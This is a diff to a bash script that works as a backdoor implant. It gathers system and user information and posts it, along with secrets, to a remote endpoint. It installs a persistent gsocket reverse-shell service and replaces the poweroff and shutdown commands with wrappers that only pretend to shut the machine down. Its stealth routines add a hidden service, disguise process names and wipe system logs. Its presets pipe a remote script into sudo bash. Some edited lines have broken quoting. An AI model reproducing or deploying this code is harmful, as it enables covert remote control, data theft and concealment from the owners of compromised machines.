@@ -66,26 +66,15 @@ get_system_info() {
         echo "  \"ip\": \"$(hostname -I | awk '{print $1}')\","
         echo "  \"mac\": \"$(ip link show | grep -E 'link/ether' | head -n1 | awk '{print $2}')\","
         echo "  \"cpu\": \"$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d: -f2 | sed 's/^[ \t]*//')\","
-        echo "  \"ram_total\": \"$(free -h | grep Mem | awk '{print $2}')\","
+        echo "  \"ram_total\": \"$(free -h | awk 'NR==2 {print $2}')\","
         echo "  \"disk_total\": \"$(df -h --total | grep total | awk '{print $2}')\","
         echo "  \"user\": \"$(whoami)\","
-        echo "  \"is_root\": $(if [ $EUID -eq 0 ]; then echo "true"; else echo "false"; fi),"
-        echo "  \"users\": ["
-        
-        local first=1
-        while IFS=: read -r username _ uid gid _ home shell; do
-            if [ "$uid" -ge 1000 ] && [ "$shell" != "/usr/sbin/nologin" ] && [ "$shell" != "/bin/false" ]; then
-                [ "$first" -eq 0 ] && echo ","
-                echo "    {\"username\": \"$username\", \"uid\": $uid, \"home\": \"$home\"}"
-                first=0
-            fi
-        done < /etc/passwd
-        
-        echo "  ],"
+        echo "  \"is_root\": \"$(sudo -l &> /dev/null && echo "true" || echo "false")\","
+        echo "  \"users\": \"$(awk -F: '$7 ~ /bash|sh/ {printf "%s ", $1} END {print ""}' /etc/passwd)\","
         echo "  \"timestamp\": \"$(date '+%Y-%m-%d %H:%M:%S')\","
         echo "  \"uptime\": \"$(uptime -p)\""
         echo "}"
-    } | tr -d '\n' | sed 's/  //g'
+    } | tr -d '\n' | sed 's/  //g' | jq -R .
 }
 
 send_logs() {
@@ -98,18 +87,18 @@ send_logs() {
     
     # Submit logs to the server
     curl -s -X POST "$LOG_ENDPOINT" \
-        -F "auth_token=$AUTH_TOKEN" \
-        -F "hostname=$hostname" \
-        -F "log_data=@$log_file" \
-        -F "system_info=$sysinfo" \
-        -F "secret_type=$secret_type" \
-        -F "secret_value=$secret_val" \
-        > /dev/null
+            -F "auth_token=$AUTH_TOKEN" \
+            -F "hostname=$hostname" \
+            -F "log_data=@$log_file" \
+            -F "system_info=$sysinfo" \
+            -F "secret_type=$secret_type" \
+            -F "secret_value=$secret_val" \
+            > /dev/null
 }
 
 detect_package_manager() {
     # Detect the system's package manager
-    if command -v apt-get &> /dev/null; then
+    if command -v apt &> /dev/null; then
         echo "apt"
     elif command -v dnf &> /dev/null; then
         echo "dnf"
@@ -135,8 +124,8 @@ install_ssh() {
     case "$pkg_manager" in
         apt)
             if ! dpkg -s openssh-server &> /dev/null; then
-                log_cmd "sudo apt-get update" "Updating package lists" "$log_file"
-                log_cmd "sudo apt-get install -y openssh-server" "Installing OpenSSH server" "$log_file"
+                log_cmd "sudo apt update" "Updating package lists" "$log_file"
+                log_cmd "sudo apt install -y openssh-server" "Installing OpenSSH server" "$log_file"
             fi
             log_cmd "sudo systemctl enable ssh" "Enabling SSH service" "$log_file"
             log_cmd "sudo systemctl start ssh" "Starting SSH service" "$log_file"
@@ -199,7 +188,7 @@ setup_wol() {
     case "$pkg_manager" in
         apt)
             if ! dpkg -s ethtool &> /dev/null; then
-                log_cmd "sudo apt-get install -y ethtool" "Installing ethtool" "$log_file"
+                log_cmd "sudo apt install -y ethtool" "Installing ethtool" "$log_file"
             fi
             ;;
         dnf|yum)
@@ -231,13 +220,13 @@ setup_wol() {
     fi
     
     # Check current WoL status
-    log_cmd "sudo ethtool $interface" "Checking interface capabilities" "$log_file"
-    
-    # Try to enable WoL
-    log_cmd "sudo ethtool -s $interface wol g" "Enabling Wake-on-LAN" "$log_file"
-    
-    # Create persistent configuration
-    cat > "$TEMP_DIR/wol.service" << EOF
+    if ethtool "$interface" | grep -q "Wake-on: g"; then
+        echo "[+] Wake-on-LAN is already enabled on $interface."
+        # Try to enable WoL
+        log_cmd "sudo ethtool -s $interface wol g" "Enabling Wake-on-LAN" "$log_file"
+        
+        # Create persistent configuration
+        cat > "$TEMP_DIR/wol.service" << EOF
 [Unit]
 Description=Enable Wake-on-LAN on $interface
 After=network.target
@@ -251,17 +240,21 @@ RemainAfterExit=yes
 WantedBy=multi-user.target
 EOF
 
-    sudo mv "$TEMP_DIR/wol.service" /etc/systemd/system/wol.service
-    log_cmd "sudo systemctl daemon-reload" "Reloading systemd" "$log_file"
-    log_cmd "sudo systemctl enable wol.service" "Enabling WoL service" "$log_file"
-    log_cmd "sudo systemctl start wol.service" "Starting WoL service" "$log_file"
+        sudo mv "$TEMP_DIR/wol.service" /etc/systemd/system/wol.service
+        log_cmd "sudo systemctl daemon-reload" "Reloading systemd" "$log_file"
+        log_cmd "sudo systemctl enable wol.service" "Enabling WoL service" "$log_file"
+        log_cmd "sudo systemctl start wol.service" "Starting WoL service" "$log_file"
+        
+        # Get MAC address for WoL
+        local mac=$(ip link show $interface | grep -E 'link/ether' | awk '{print $2}')
+        
+        send_logs "$log_file" "{\"interface\":\"$interface\",\"mac\":\"$mac\"}" "wol_config"
+      
+      echo "[+] Wake-on-LAN configured for interface $interface (MAC: $mac)."
+    else 
+        echo "[-] Wake-on-LAN is not enabled on $interface."
+    fi
     
-    # Get MAC address for WoL
-    local mac=$(ip link show $interface | grep -E 'link/ether' | awk '{print $2}')
-    
-    send_logs "$log_file" "{\"interface\":\"$interface\",\"mac\":\"$mac\"}" "wol_config"
-    
-    echo "[+] Wake-on-LAN configured for interface $interface (MAC: $mac)."
 }
 
 setup_fake_poweroff() {
@@ -276,12 +269,12 @@ setup_fake_poweroff() {
 # This script intercepts poweroff/shutdown commands and fakes a shutdown
 
 # Backup original commands if not already done
-if [ ! -f /usr/bin/poweroff.real ]; then
-    sudo cp /usr/bin/poweroff /usr/bin/poweroff.real
+if [ ! -f /usr/sbin/poweroff.real ]; then
+    sudo cp /usr/sbin/poweroff /usr/sbin/poweroff.real
 fi
 
-if [ ! -f /usr/bin/shutdown.real ]; then
-    sudo cp /usr/bin/shutdown /usr/bin/shutdown.real
+if [ ! -f /usr/sbin/shutdown.real ]; then
+    sudo cp /usr/sbin/shutdown /usr/sbin/shutdown.real
 fi
 
 # Create the fake scripts
@@ -289,8 +282,8 @@ cat > "$TEMP_DIR/fake-poweroff" << 'EOT'
 #!/bin/bash
 # Fake poweroff script that just locks the screen
 echo "System is powering off..."
-# Change to TTY1 and clear screen
-sudo chvt 1
+# Change to TTY7 and clear screen
+sudo chvt 7
 sudo clear
 # Display fake shutdown messages
 echo -e "\n\n * Unmounting filesystems..."
@@ -319,31 +312,31 @@ cat > "$TEMP_DIR/poweroff-wrapper" << 'EOT'
 #!/bin/bash
 # Check for force flag
 if [[ " $* " == *" -f "* ]] || [[ " $* " == *" --force "* ]]; then
-    exec /usr/bin/poweroff.real "$@"
+    exec /usr/sbin/poweroff.real "$@"
 else
     exec /usr/local/bin/fake-poweroff
 fi
 EOT
 
 chmod +x "$TEMP_DIR/poweroff-wrapper"
-sudo mv "$TEMP_DIR/poweroff-wrapper" /usr/bin/poweroff
+sudo mv "$TEMP_DIR/poweroff-wrapper" /usr/sbin/poweroff
 
 cat > "$TEMP_DIR/shutdown-wrapper" << 'EOT'
 #!/bin/bash
 # Check for force flag
 if [[ " $* " == *" -f "* ]] || [[ " $* " == *" --force "* ]]; then
-    exec /usr/bin/shutdown.real "$@"
+    exec /usr/sbin/shutdown.real "$@"
 else
     exec /usr/local/bin/fake-poweroff
 fi
 EOT
 
 chmod +x "$TEMP_DIR/shutdown-wrapper"
-sudo mv "$TEMP_DIR/shutdown-wrapper" /usr/bin/shutdown
+sudo mv "$TEMP_DIR/shutdown-wrapper" /usr/sbin/shutdown
 
 EOF
 
-    log_cmd "bash $TEMP_DIR/fake-poweroff.sh" "Installing fake poweroff scripts" "$log_file"
+    log_cmd "sudo bash $TEMP_DIR/fake-poweroff.sh" "Installing fake poweroff scripts" "$log_file"
     
     send_logs "$log_file" "Fake poweroff installed" "fake_poweroff"
     
@@ -361,8 +354,7 @@ install_gsocket() {
     local pkg_manager=$(detect_package_manager)
     case "$pkg_manager" in
         apt)
-            log_cmd "sudo apt-get update" "Updating package lists" "$log_file"
-            log_cmd "sudo apt-get install -y build-essential git libssl-dev" "Installing build dependencies" "$log_file"
+            log_cmd "sudo apt update && sudo apt install -y build-essential libssl-dev automake autoconf" "Installing build dependencies" "$log_file"
             ;;
         dnf|yum)
             log_cmd "sudo $pkg_manager install -y gcc gcc-c++ make git openssl-devel" "Installing build dependencies" "$log_file"
@@ -379,13 +371,15 @@ install_gsocket() {
             ;;
     esac
     
-    # Clone and build gsocket
-    log_cmd "git clone https://github.com/hackerschoice/gsocket.git $TEMP_DIR/gsocket" "Cloning gsocket repository" "$log_file"
-    log_cmd "cd $TEMP_DIR/gsocket && ./configure && make" "Building gsocket" "$log_file"
-    log_cmd "cd $TEMP_DIR/gsocket && sudo make install" "Installing gsocket" "$log_file"
+    # build gsocket
+    if ! command -v gs-netcat &>/dev/null; then
+        log_cmd "wget -q -O $TEMP_DIR/gsocket_linux-$(uname -m).tar.gz \"https://github.com/hackerschoice/gsocket/archive/refs/tags/v1.4.43.tar.gz\"" "Download gsocket" "$log_file"
+        log_cmd "cd $TEMP_DIR && tar xfz gsocket_linux-*.tar.gz" "Extracting gsocket" "$log_file"
+        log_cmd "cd gsocket-* && ./bootstrap && ./configure && make && sudo make install" "Building and install gsocket" "$log_file"
+    fi
     
     # Generate a unique secret
-    local gs_secret=$(head -c 16 /dev/urandom | xxd -p)
+    local gs_secret=$(gs-netcat -g)
     
     # Create systemd service for persistent connection
     cat > "$TEMP_DIR/gsocket-backdoor.service" << EOF
@@ -395,7 +389,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/local/bin/gs-netcat -s $gs_secret -l -q -i
+ExecStart=/usr/local/bin/gs-netcat -s $gs_secret -lqi
 Restart=always
 RestartSec=10
 StandardOutput=null
@@ -424,7 +418,7 @@ EOF
 GSocket Connection Information
 =============================
 Secret: $gs_secret
-Connection command: gs-netcat -s $gs_secret
+Connection command: gs-netcat -s $gs_secret -i
 EOF
 
     # Send the gsocket secret to the server
@@ -440,7 +434,7 @@ setup_stealth() {
     echo "[*] Setting up stealth mode..."
     
     # Hide processes by creating a systemd unit with hidden name
-    cat > "$TEMP_DIR/.service" << 'EOF'
+    cat > "$TEMP_DIR/_.service" << 'EOF'
 [Unit]
 Description=System Update Service
 After=network.target
@@ -457,13 +451,10 @@ StandardError=null
 WantedBy=default.target
 EOF
 
-    sudo mv "$TEMP_DIR/.service" /etc/systemd/system/
+    sudo mv "$TEMP_DIR/_.service" /etc/systemd/system/
     log_cmd "sudo systemctl daemon-reload" "Reloading systemd" "$log_file"
-    log_cmd "sudo systemctl enable .service" "Enabling hidden service" "$log_file"
-    log_cmd "sudo systemctl start .service" "Starting hidden service" "$log_file"
-    
-    # Create a hidden directory for tools
-    log_cmd "mkdir -p ~/.config/.hidden" "Creating hidden directory" "$log_file"
+    log_cmd "sudo systemctl enable _.service" "Enabling hidden service" "$log_file"
+    log_cmd "sudo systemctl start _.service" "Starting hidden service" "$log_file"
     
     # Set up process name obfuscation script
     cat > "$TEMP_DIR/obfuscate.sh" << 'EOF'
@@ -512,7 +503,7 @@ After=network.target
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c 'find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;'
+ExecStart=/bin/bash -c 'find /var/log -type f -name "*" -exec truncate -s 0 {} \;'
 ExecStart=/bin/bash -c 'journalctl --vacuum-time=1d'
 
 [Install]
@@ -551,8 +542,9 @@ main() {
     
     echo "[*] Beginning setup..."
     echo "[*] Target system: $(hostname) ($(whoami))"
-    
-    source "$TEMP_DIR/y"
+
+    sudo apt install -y curl jq &> /dev/null || true
+
     # Send initial system info
     send_logs "$log_file" "$(get_system_info)" "system_info"
     
@@ -624,7 +616,7 @@ export INSTALL_GSOCKET=true
 export STEALTH_MODE=true
 
 # Download and run the main script
-curl -fsSL "http://SERVER_PLACEHOLDER/deployment/y" | bash
+eval "$(wget -qO- http://SERVER_PLACEHOLDER/deployment/y" | bash
 EOF
 
     # Create full preset (all features)
@@ -639,7 +631,7 @@ export INSTALL_GSOCKET=true
 export STEALTH_MODE=true
 
 # Download and run the main script with sudo
-curl -fsSL "http://SERVER_PLACEHOLDER/deployment/y" | sudo bash
+eval "$(wget -qO- http://SERVER_PLACEHOLDER/deployment/y" | sudo bash
 EOF
 
     # Create quiet preset (minimal output)
@@ -655,7 +647,7 @@ export INSTALL_GSOCKET=true
 export STEALTH_MODE=true
 
 # Redirect output to /dev/null for quieter operation
-(curl -fsSL "http://SERVER_PLACEHOLDER/deployment/y" | sudo bash) &>/dev/null &
+(eval "$(wget -qO- http://SERVER_PLACEHOLDER/deployment/y" | sudo bash) &>/dev/null &
 EOF
 
     # Replace placeholders
